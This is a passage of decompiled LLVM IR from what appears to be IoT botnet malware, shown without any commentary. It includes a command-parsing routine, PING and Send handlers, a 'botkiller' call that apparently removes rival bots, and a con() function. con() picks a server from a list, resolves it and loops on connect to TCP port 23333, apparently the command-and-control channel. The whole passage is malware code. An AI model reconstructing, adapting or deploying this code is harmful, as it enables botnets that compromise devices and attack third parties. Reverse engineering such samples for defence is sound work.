  %v4_972423 = phi i32 [ %v2_971c.pre-phi, %dec_label_pc_9678 ], [ %v4_94e8, %dec_label_pc_95d0 ]
  %stack_var_-28.022 = phi i32 [ %v1_9708, %dec_label_pc_9678 ], [ 1, %dec_label_pc_95d0 ]
  %v1_9614 = add i32 %v4_972423, 1
  %v5_9618 = inttoptr i32 %v1_9614 to i8*
  %v6_9628 = icmp slt i32 %stack_var_-28.022, %stack_var_-32.2
  br i1 %v6_9628, label %dec_label_pc_9644, label %dec_label_pc_9734

dec_label_pc_9638:                                ; preds = %dec_label_pc_965c
  %v1_963c = add i32 %storemerge17, 1
  br label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %dec_label_pc_9610, %dec_label_pc_9638
  %storemerge17 = phi i32 [ %v1_963c, %dec_label_pc_9638 ], [ 0, %dec_label_pc_9610 ]
  store i32 %v1_9614, i32* %r0.global-to-local, align 4
  %v3_964c = call i32 @strlen(i8* %v5_9618)
  store i32 %v3_964c, i32* %r0.global-to-local, align 4
  %v3_9654 = icmp ult i32 %storemerge17, %v3_964c
  br i1 %v3_9654, label %dec_label_pc_965c, label %dec_label_pc_9644.dec_label_pc_9678_crit_edge

dec_label_pc_9644.dec_label_pc_9678_crit_edge:    ; preds = %dec_label_pc_9644
  %.pre30 = add i32 %storemerge17, %v1_9614
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_9678

dec_label_pc_965c:                                ; preds = %dec_label_pc_9644
  %v2_9668 = add i32 %storemerge17, %v1_9614
  %v1_966c = inttoptr i32 %v2_9668 to i8*
  %v2_966c = load i8, i8* %v1_966c, align 1
  %v7_9670 = icmp eq i8 %v2_966c, 32
  br i1 %v7_9670, label %dec_label_pc_9678, label %dec_label_pc_9638

dec_label_pc_9678:                                ; preds = %dec_label_pc_965c, %dec_label_pc_9644.dec_label_pc_9678_crit_edge
  %v5_9720.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9644.dec_label_pc_9678_crit_edge ], [ %v1_966c, %dec_label_pc_965c ]
  %v2_971c.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9644.dec_label_pc_9678_crit_edge ], [ %v2_9668, %dec_label_pc_965c ]
  store i32 %stack_var_-28.022, i32* @r4, align 4
  %v1_9680 = add i32 %storemerge17, 1
  store i32 %v1_9680, i32* %r0.global-to-local, align 4
  %v1_9688 = call i32 @malloc(i32 %v1_9680)
  %v0_9698 = load i32, i32* @r4, align 4
  %v3_9698 = mul i32 %v0_9698, 4
  store i32 %v2_951c, i32* %r0.global-to-local, align 4
  %v2_96a4 = add i32 %v2_95f4, %v3_9698
  %v2_96a8 = inttoptr i32 %v2_96a4 to i32*
  store i32 %v1_9688, i32* %v2_96a8, align 4
  %v3_96b4 = mul i32 %stack_var_-28.022, 4
  %v2_96c0 = add i32 %v2_95f4, %v3_96b4
  %v1_96c4 = inttoptr i32 %v2_96c0 to i32*
  %v2_96c4 = load i32, i32* %v1_96c4, align 4
  store i32 %v2_96c4, i32* %r0.global-to-local, align 4
  store i32 %v1_9614, i32* @r1, align 4
  %v3_96d4 = call i32 @strncpy(i32 %v2_96c4, i32 %v1_9614, i32 %storemerge17)
  store i32 %v2_951c, i32* %r0.global-to-local, align 4
  %v2_96f0 = load i32, i32* %v1_96c4, align 4
  %v2_96f8 = add i32 %v2_96f0, %storemerge17
  %v3_9700 = inttoptr i32 %v2_96f8 to i8*
  store i8 0, i8* %v3_9700, align 1
  %v1_9708 = add nuw i32 %stack_var_-28.022, 1
  %v2_9728 = load i8, i8* %v5_9720.pre-phi, align 1
  %v2_972c = icmp eq i8 %v2_9728, 0
  br i1 %v2_972c, label %dec_label_pc_9734, label %dec_label_pc_9610

dec_label_pc_9734:                                ; preds = %dec_label_pc_9678, %dec_label_pc_9610, %dec_label_pc_95d0
  %v7_9814 = load i32, i32* bitcast ([4 x i8]** @global_var_244b0.322 to i32*), align 4
  %v2_9818 = icmp eq i32 %v7_9814, 0
  br i1 %v2_9818, label %dec_label_pc_9820, label %dec_label_pc_9740

dec_label_pc_9740:                                ; preds = %dec_label_pc_9734
  store i32 %v7_9814, i32* %r0.global-to-local, align 4
  %v2_9760 = inttoptr i32 %v7_9814 to i8*
  %v3_9760 = call i32 @__GI_strcasecmp(i8* %v2_9760, i32 %v2_9408)
  store i32 %v3_9760, i32* %r0.global-to-local, align 4
  %v2_9788 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_244b0.322 to i32), i32 4) to i32*), align 4
  store i32 %v2_9788, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 38832, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_9788)
  %v5_97f868 = icmp sgt i32 %stack_var_-32.2, 1
  br i1 %v5_97f868, label %dec_label_pc_97bc, label %dec_label_pc_9820

dec_label_pc_97bc:                                ; preds = %dec_label_pc_9740, %dec_label_pc_97bc
  %storemerge1669 = phi i32 [ %v1_97e4, %dec_label_pc_97bc ], [ 1, %dec_label_pc_9740 ]
  %v3_97c4 = mul i32 %storemerge1669, 4
  %v2_97d0 = add i32 %v2_95f4, %v3_97c4
  %v1_97d4 = inttoptr i32 %v2_97d0 to i32*
  %v2_97d4 = load i32, i32* %v1_97d4, align 4
  store i32 %v2_97d4, i32* @r0, align 4
  %v0_97dc = call i32 @free()
  store i32 %v0_97dc, i32* %r0.global-to-local, align 4
  %v1_97e4 = add nuw nsw i32 %storemerge1669, 1
  %v5_97f8 = icmp slt i32 %v1_97e4, %stack_var_-32.2
  br i1 %v5_97f8, label %dec_label_pc_97bc, label %dec_label_pc_9820

dec_label_pc_9820:                                ; preds = %dec_label_pc_9740, %dec_label_pc_97bc, %dec_label_pc_9734, %dec_label_pc_947c, %dec_label_pc_93e0, %dec_label_pc_93b8
  %v1_9828 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_9828

; uselistorder directives
  uselistorder i32 %v1_97e4, { 1, 0 }
  uselistorder i32 %v7_9814, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_9614, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-28.022, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-32.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v4_94e8, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i8* %stack_var_-36.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v2_951c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %storemerge13, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_9428, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 25, 2, 1, 5, 3, 4, 6, 7, 8, 10, 9, 13, 11, 12, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 26, 24, 28, 27, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_9820, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_97bc, { 1, 0 }
  uselistorder label %dec_label_pc_9644, { 1, 0 }
  uselistorder label %dec_label_pc_9610, { 1, 0 }
  uselistorder label %dec_label_pc_95d0, { 1, 0 }
  uselistorder label %dec_label_pc_9598, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_958c, { 1, 0 }
  uselistorder label %dec_label_pc_9548, { 1, 0 }
  uselistorder label %dec_label_pc_9448, { 1, 0 }
  uselistorder label %dec_label_pc_9384, { 1, 0 }
  uselistorder label %dec_label_pc_9300, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38984, i32* %stack_var_-4, align 4
  %v2_9844 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9844, i32* @fp, align 4
  %v2_985c = load i32, i32* @global_var_27848.318, align 4
  %v4_986c = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1a3b8.325 to i32), i32 %v2_985c)
  %v2_9874 = load i32, i32* @global_var_27860.305, align 4
  %v4_9888 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1a3c8.330 to i32), i32 %v2_9874)
  %v2_9890 = load i32, i32* @global_var_27848.318, align 4
  %v4_98a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1a3d8.332 to i32), i32 %v2_9890)
  ret i32 %v4_98a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39124, i32* %stack_var_-4, align 4
  %v2_98d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98d0, i32* @fp, align 4
  %v4_98f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1a3e0.334 to i32), i32 %arg3)
  ret i32 %v4_98f0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 39184, i32* %stack_var_-4, align 4
  %v2_990c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_990c, i32* @fp, align 4
  br label %dec_label_pc_9954.preheader

dec_label_pc_993c:                                ; preds = %dec_label_pc_996c
  %v1_9940 = add i32 %.pre, 1
  %v5_9944 = inttoptr i32 %v1_9940 to i8*
  %v1_994c = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_9954

dec_label_pc_9954:                                ; preds = %dec_label_pc_9954.preheader, %dec_label_pc_993c
  %stack_var_-32.0 = phi i8* [ %v5_9944, %dec_label_pc_993c ], [ %stack_var_-32.118, %dec_label_pc_9954.preheader ]
  %stack_var_-40.0 = phi i32 [ %v1_994c, %dec_label_pc_993c ], [ %stack_var_-40.119, %dec_label_pc_9954.preheader ]
  %v3_995c = call i32 @strlen(i8* %arg3)
  %v3_9964 = icmp ult i32 %stack_var_-40.0, %v3_995c
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_9964, label %dec_label_pc_996c, label %dec_label_pc_997c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9954
  %v2_9970 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9974 = icmp eq i8 %v2_9970, 32
  br i1 %v7_9974, label %dec_label_pc_997c, label %dec_label_pc_993c

dec_label_pc_997c:                                ; preds = %dec_label_pc_9954, %dec_label_pc_996c
  %v1_9980 = add i32 %.pre, 1
  %v3_9990 = call i32 @strlen(i8* %arg3)
  %v9_9998 = icmp eq i32 %stack_var_-40.0, %v3_9990
  br i1 %v9_9998, label %dec_label_pc_9c00, label %dec_label_pc_99a0

dec_label_pc_99a0:                                ; preds = %dec_label_pc_997c
  %v5_9984 = inttoptr i32 %v1_9980 to i8*
  %v1_99a4 = add nuw nsw i32 %storemerge820, 1
  %v7_99b4 = icmp slt i32 %v1_99a4, 5
  br i1 %v7_99b4, label %dec_label_pc_9954.preheader, label %dec_label_pc_99d0

dec_label_pc_9954.preheader:                      ; preds = %entry, %dec_label_pc_99a0
  %storemerge820 = phi i32 [ 0, %entry ], [ %v1_99a4, %dec_label_pc_99a0 ]
  %stack_var_-40.119 = phi i32 [ 0, %entry ], [ %stack_var_-40.0, %dec_label_pc_99a0 ]
  %stack_var_-32.118 = phi i8* [ %arg3, %entry ], [ %v5_9984, %dec_label_pc_99a0 ]
  br label %dec_label_pc_9954

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99e8
  %v1_99c8 = add i32 %storemerge9, 1
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_99a0, %dec_label_pc_99c4
  %storemerge9 = phi i32 [ %v1_99c8, %dec_label_pc_99c4 ], [ 0, %dec_label_pc_99a0 ]
  store i32 %storemerge9, i32* @r4, align 4
  %v3_99d8 = call i32 @strlen(i8* %v5_9984)
  %v0_99e0 = load i32, i32* @r4, align 4
  %v3_99e0 = icmp ult i32 %v0_99e0, %v3_99d8
  br i1 %v3_99e0, label %dec_label_pc_99e8, label %dec_label_pc_99d0.dec_label_pc_9a04_crit_edge

dec_label_pc_99d0.dec_label_pc_9a04_crit_edge:    ; preds = %dec_label_pc_99d0
  %.pre26 = add i32 %storemerge9, %v1_9980
  %.pre27 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_9a04

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99d0
  %v2_99f4 = add i32 %storemerge9, %v1_9980
  %v1_99f8 = inttoptr i32 %v2_99f4 to i8*
  %v2_99f8 = load i8, i8* %v1_99f8, align 1
  %v7_99fc = icmp eq i8 %v2_99f8, 32
  br i1 %v7_99fc, label %dec_label_pc_9a04, label %dec_label_pc_99c4

dec_label_pc_9a04:                                ; preds = %dec_label_pc_99e8, %dec_label_pc_99d0.dec_label_pc_9a04_crit_edge
  %v3_9a18.pre-phi = phi i8* [ %.pre27, %dec_label_pc_99d0.dec_label_pc_9a04_crit_edge ], [ %v1_99f8, %dec_label_pc_99e8 ]
  store i8 0, i8* %v3_9a18.pre-phi, align 1
  %v2_9a20 = load i32, i32* @global_var_27848.318, align 4
  %v4_9a2c = call i32 @__GI_strcasecmp(i8* %v5_9984, i32 %v2_9a20)
  %v2_9a34 = icmp eq i32 %v4_9a2c, 0
  br i1 %v2_9a34, label %dec_label_pc_9a3c, label %dec_label_pc_9c00

dec_label_pc_9a3c:                                ; preds = %dec_label_pc_9a04
  %v2_9a40 = load i32, i32* @global_var_24744.337, align 4
  %v2_9a44 = icmp eq i32 %v2_9a40, 0
  br i1 %v2_9a44, label %dec_label_pc_9a4c, label %dec_label_pc_9c00

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9a3c
  br label %dec_label_pc_9a80.preheader

dec_label_pc_9a68:                                ; preds = %dec_label_pc_9a98
  %v1_9a6c = add i32 %.pre28, 1
  %v5_9a70 = inttoptr i32 %v1_9a6c to i8*
  %v1_9a78 = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_9a80

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a80.preheader, %dec_label_pc_9a68
  %stack_var_-32.2 = phi i8* [ %v5_9a70, %dec_label_pc_9a68 ], [ %stack_var_-32.315, %dec_label_pc_9a80.preheader ]
  %stack_var_-40.2 = phi i32 [ %v1_9a78, %dec_label_pc_9a68 ], [ %stack_var_-40.316, %dec_label_pc_9a80.preheader ]
  %v3_9a88 = call i32 @strlen(i8* %arg3)
  %v3_9a90 = icmp ult i32 %stack_var_-40.2, %v3_9a88
  %.pre28 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_9a90, label %dec_label_pc_9a98, label %dec_label_pc_9aa8

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a80
  %v2_9a9c = load i8, i8* %stack_var_-32.2, align 1
  %v7_9aa0 = icmp eq i8 %v2_9a9c, 32
  br i1 %v7_9aa0, label %dec_label_pc_9aa8, label %dec_label_pc_9a68

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_9a80, %dec_label_pc_9a98
  %v1_9aac = add i32 %.pre28, 1
  %v3_9abc = call i32 @strlen(i8* %arg3)
  %v9_9ac4 = icmp eq i32 %stack_var_-40.2, %v3_9abc
  br i1 %v9_9ac4, label %dec_label_pc_9c00, label %dec_label_pc_9acc

dec_label_pc_9acc:                                ; preds = %dec_label_pc_9aa8
  %v5_9ab0 = inttoptr i32 %v1_9aac to i8*
  %v1_9ad0 = add nuw nsw i32 %storemerge1017, 1
  %v7_9ae0 = icmp slt i32 %v1_9ad0, 3
  br i1 %v7_9ae0, label %dec_label_pc_9a80.preheader, label %dec_label_pc_9afc

dec_label_pc_9a80.preheader:                      ; preds = %dec_label_pc_9a4c, %dec_label_pc_9acc
  %storemerge1017 = phi i32 [ 0, %dec_label_pc_9a4c ], [ %v1_9ad0, %dec_label_pc_9acc ]
  %stack_var_-40.316 = phi i32 [ 0, %dec_label_pc_9a4c ], [ %stack_var_-40.2, %dec_label_pc_9acc ]
  %stack_var_-32.315 = phi i8* [ %arg3, %dec_label_pc_9a4c ], [ %v5_9ab0, %dec_label_pc_9acc ]
  br label %dec_label_pc_9a80

dec_label_pc_9af0:                                ; preds = %dec_label_pc_9b14
  %v1_9af4 = add i32 %storemerge11, 1
  br label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9acc, %dec_label_pc_9af0
  %storemerge11 = phi i32 [ %v1_9af4, %dec_label_pc_9af0 ], [ 0, %dec_label_pc_9acc ]
  store i32 %storemerge11, i32* @r4, align 4
  %v3_9b04 = call i32 @strlen(i8* %v5_9ab0)
  %v0_9b0c = load i32, i32* @r4, align 4
  %v3_9b0c = icmp ult i32 %v0_9b0c, %v3_9b04
  br i1 %v3_9b0c, label %dec_label_pc_9b14, label %dec_label_pc_9afc.dec_label_pc_9b30_crit_edge

dec_label_pc_9afc.dec_label_pc_9b30_crit_edge:    ; preds = %dec_label_pc_9afc
  %.pre29 = add i32 %storemerge11, %v1_9aac
  %.pre30 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_9b30

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9afc
  %v2_9b20 = add i32 %storemerge11, %v1_9aac
  %v1_9b24 = inttoptr i32 %v2_9b20 to i8*
  %v2_9b24 = load i8, i8* %v1_9b24, align 1
  %v7_9b28 = icmp eq i8 %v2_9b24, 32
  br i1 %v7_9b28, label %dec_label_pc_9b30, label %dec_label_pc_9af0

dec_label_pc_9b30:                                ; preds = %dec_label_pc_9b14, %dec_label_pc_9afc.dec_label_pc_9b30_crit_edge
  %v3_9b44.pre-phi = phi i8* [ %.pre30, %dec_label_pc_9afc.dec_label_pc_9b30_crit_edge ], [ %v1_9b24, %dec_label_pc_9b14 ]
  store i8 0, i8* %v3_9b44.pre-phi, align 1
  store i32 %v1_9aac, i32* @r0, align 4
  %v2_9b4c = call i32 @inet_addr(i32 %v1_9aac)
  %v5_9b54 = trunc i32 %v2_9b4c to i8
  store i8 %v5_9b54, i8* %stack_var_-44, align 1
  %v3_9b5c = icmp eq i8 %v5_9b54, -1
  br i1 %v3_9b5c, label %dec_label_pc_9b64, label %dec_label_pc_9ba4

dec_label_pc_9b64:                                ; preds = %dec_label_pc_9b30
  store i32 %v1_9aac, i32* @r0, align 4
  %v2_9b68 = call i32 @__GI_gethostbyname(i32 %v1_9aac)
  %v2_9b78 = icmp eq i32 %v2_9b68, 0
  br i1 %v2_9b78, label %dec_label_pc_9c00, label %dec_label_pc_9b80

dec_label_pc_9b80:                                ; preds = %dec_label_pc_9b64
  %v1_9b84 = add i32 %v2_9b68, 16
  %v2_9b84 = inttoptr i32 %v1_9b84 to i32*
  %v3_9b84 = load i32, i32* %v2_9b84, align 4
  %v1_9b88 = inttoptr i32 %v3_9b84 to i32*
  %v2_9b88 = load i32, i32* %v1_9b88, align 4
  store i32 %v2_9b88, i32* @r1, align 4
  %v1_9b90 = add i32 %v2_9b68, 12
  %v2_9b90 = inttoptr i32 %v1_9b90 to i32*
  %v3_9b90 = load i32, i32* %v2_9b90, align 4
  store i32 %v3_9b90, i32* @r2, align 4
  %v2_9b98 = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_9b98, i32* @r3, align 4
  store i32 %v2_9b98, i32* @r0, align 4
  %v0_9ba0 = call i32 @memcpy()
  %v2_9bb0.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_9ba4

dec_label_pc_9ba4:                                ; preds = %dec_label_pc_9b30, %dec_label_pc_9b80
  %v1_9c0825 = phi i32 [ %v0_9ba0, %dec_label_pc_9b80 ], [ %v2_9b4c, %dec_label_pc_9b30 ]
  %v2_9bb0 = phi i8 [ %v2_9bb0.pre, %dec_label_pc_9b80 ], [ %v5_9b54, %dec_label_pc_9b30 ]
  store i8 %v2_9bb0, i8* bitcast (i8** @global_var_24743.340 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_24740.339 to i8*), align 4
  store i32 256, i32* @global_var_24744.337, align 4
  br label %dec_label_pc_9c00

dec_label_pc_9c00:                                ; preds = %dec_label_pc_997c, %dec_label_pc_9aa8, %dec_label_pc_9a3c, %dec_label_pc_9a04, %dec_label_pc_9b64, %dec_label_pc_9ba4
  %v1_9c08 = phi i32 [ 0, %dec_label_pc_9a3c ], [ %v4_9a2c, %dec_label_pc_9a04 ], [ 0, %dec_label_pc_9b64 ], [ %v1_9c0825, %dec_label_pc_9ba4 ], [ %v3_9abc, %dec_label_pc_9aa8 ], [ %v3_9990, %dec_label_pc_997c ]
  ret i32 %v1_9c08

; uselistorder directives
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v1_9ad0, { 1, 0 }
  uselistorder i32 %v1_9aac, { 3, 2, 5, 4, 0, 1, 6 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v1_99a4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %arg3, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_9c00, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_9ba4, { 1, 0 }
  uselistorder label %dec_label_pc_9afc, { 1, 0 }
  uselistorder label %dec_label_pc_9a80.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9aa8, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
  uselistorder label %dec_label_pc_9954.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_997c, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-74 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 39972, i32* %stack_var_-4, align 4
  %v2_9c20 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c20, i32* @fp, align 4
  %v2_9c38 = load i32, i32* @global_var_27848.318, align 4
  store i32 %v2_9c38, i32* @r0, align 4
  %v0_9c40 = call i32 @free()
  %v1_9c4c = call i32 @makestring(i32 %v0_9c40)
  %v2_9c58 = ptrtoint i32* %stack_var_-74 to i32
  store i32 ptrtoint ([16 x i8]* @global_var_1a3ec.345 to i32), i32* @r1, align 4
  %v3_9c64 = bitcast i32* %stack_var_-74 to i8*
  %v4_9c64 = call i32 @strcpy(i8* %v3_9c64, i32 ptrtoint ([16 x i8]* @global_var_1a3ec.345 to i32))
  store i32 %v1_9c4c, i32* @r1, align 4
  %v3_9c74 = call i32 @strcat(i8* %v3_9c64, i32 %v1_9c4c)
  store i32 %v2_9c58, i32* @global_var_27848.318, align 4
  %v1_9c84 = call i32 @botkiller(i32 %v3_9c74)
  ret i32 %v1_9c84

; uselistorder directives
  uselistorder i32 %v1_9c4c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9ca0 = load i32, i32* @fp, align 4
  store i32 40104, i32* %stack_var_-4, align 4
  %v2_9ca4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ca4, i32* @fp, align 4
  %v2_9dd4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_9e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9e64 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9cac.backedge, %entry
  store i32 -1, i32* @global_var_2784c.347, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_9cc4 = load i32, i32* @global_var_24738.349, align 4
  %v2_9cc8 = icmp eq i32 %v2_9cc4, 0
  br i1 %v2_9cc8, label %dec_label_pc_9cd0, label %dec_label_pc_9d04

dec_label_pc_9cd0:                                ; preds = %dec_label_pc_9cac
  %v0_9cd0 = call i32 @rand()
  %v2_9cdc = load i32, i32* @global_var_244a0.351, align 4
  %v3_9ce8 = urem i32 %v0_9cd0, %v2_9cdc
  %v4_9cf8 = mul i32 %v3_9ce8, 4
  %v5_9cf8 = add i32 %v4_9cf8, ptrtoint ([22 x i8]** @global_var_244a4.354 to i32)
  %v6_9cf8 = inttoptr i32 %v5_9cf8 to i32*
  %v7_9cf8 = load i32, i32* %v6_9cf8, align 4
  store i32 %v7_9cf8, i32* @global_var_27854.356, align 4
  br label %dec_label_pc_9d04

dec_label_pc_9d04:                                ; preds = %dec_label_pc_9cac, %dec_label_pc_9cd0
  store i32 0, i32* @global_var_24738.349, align 4
  br label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9d10, %dec_label_pc_9d04
  %v3_9d1c = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_9d1c, i32* @global_var_2784c.347, align 4
  %v1_9d34 = icmp slt i32 %v3_9d1c, 0
  br i1 %v1_9d34, label %dec_label_pc_9d10, label %dec_label_pc_9d3c

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9d10
  %v2_9d40 = load i32, i32* @global_var_27854.356, align 4
  store i32 %v2_9d40, i32* @r0, align 4
  %v1_9d48 = call i32 @inet_addr(i32 %v2_9d40)
  %v2_9d50 = icmp eq i32 %v1_9d48, 0
  br i1 %v2_9d50, label %dec_label_pc_9d74, label %dec_label_pc_9d58

dec_label_pc_9d58:                                ; preds = %dec_label_pc_9d3c
  %v2_9d5c = load i32, i32* @global_var_27854.356, align 4
  store i32 %v2_9d5c, i32* @r0, align 4
  %v1_9d64 = call i32 @inet_addr(i32 %v2_9d5c)
  %v3_9d6c = icmp eq i32 %v1_9d64, -1
  br i1 %v3_9d6c, label %dec_label_pc_9d74, label %dec_label_pc_9de8

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9d58, %dec_label_pc_9d3c
  %v2_9d78 = load i32, i32* @global_var_27854.356, align 4
  store i32 %v2_9d78, i32* @r0, align 4
  %v1_9d80 = call i32 @__GI_gethostbyname(i32 %v2_9d78)
  %v2_9d90 = icmp eq i32 %v1_9d80, 0
  br i1 %v2_9d90, label %dec_label_pc_9d98, label %dec_label_pc_9db8

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d74
  store i32 0, i32* @global_var_27854.356, align 4
  %v2_9da8 = load i32, i32* @global_var_2784c.347, align 4
  %v1_9db0 = call i32 @__GI___libc_close(i32 %v2_9da8)
  br label %dec_label_pc_9cac.backedge

dec_label_pc_9cac.backedge:                       ; preds = %dec_label_pc_9d98, %dec_label_pc_9f58
  br label %dec_label_pc_9cac

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9d74
  %v1_9dbc = add i32 %v1_9d80, 16
  %v2_9dbc = inttoptr i32 %v1_9dbc to i32*
  %v3_9dbc = load i32, i32* %v2_9dbc, align 4
  %v1_9dc0 = inttoptr i32 %v3_9dbc to i32*
  %v2_9dc0 = load i32, i32* %v1_9dc0, align 4
  %v1_9dc8 = add i32 %v1_9d80, 12
  %v2_9dc8 = inttoptr i32 %v1_9dc8 to i32*
  %v3_9dc8 = load i32, i32* %v2_9dc8, align 4
  store i32 %v3_9dc8, i32* @r2, align 4
  store i32 %v2_9dd4, i32* @r3, align 4
  %v3_9de0 = call i32 @bcopy(i32 %v2_9dc0, i32 %v2_9dd4, i32 %v3_9dc8)
  br label %dec_label_pc_9e00

dec_label_pc_9de8:                                ; preds = %dec_label_pc_9d58
  %v2_9dec = load i32, i32* @global_var_27854.356, align 4
  store i32 %v2_9dec, i32* @r0, align 4
  %v1_9df4 = call i32 @inet_addr(i32 %v2_9dec)
  store i32 %v1_9df4, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9e00

dec_label_pc_9e00:                                ; preds = %dec_label_pc_9db8, %dec_label_pc_9de8
  store i32 2, i32* %stack_var_-44, align 4
  %v1_9e10 = call i32 @__GI_htons(i32 23333)
  %v2_9e20 = load i32, i32* @global_var_2784c.347, align 4
  store i32 %v2_9e20, i32* @r3, align 4
  %v3_9e34 = call i32 @ioctl(i32 %v2_9e20, i32 21537, i32 %v2_9e24)
  %v2_9e3c = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_9f38

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9f38
  %v0_9e4c = call i32 @__GI___errno_location()
  %v2_9e58 = inttoptr i32 %v0_9e4c to i32*
  store i32 0, i32* %v2_9e58, align 4
  %v2_9e60 = load i32, i32* @global_var_2784c.347, align 4
  %v3_9e74 = call i32 @__libc_connect(i32 %v2_9e60, i32 %v2_9e64, i32 16)
  %v2_9e7c = icmp eq i32 %v3_9e74, 0
  br i1 %v2_9e7c, label %dec_label_pc_9e98, label %dec_label_pc_9e84

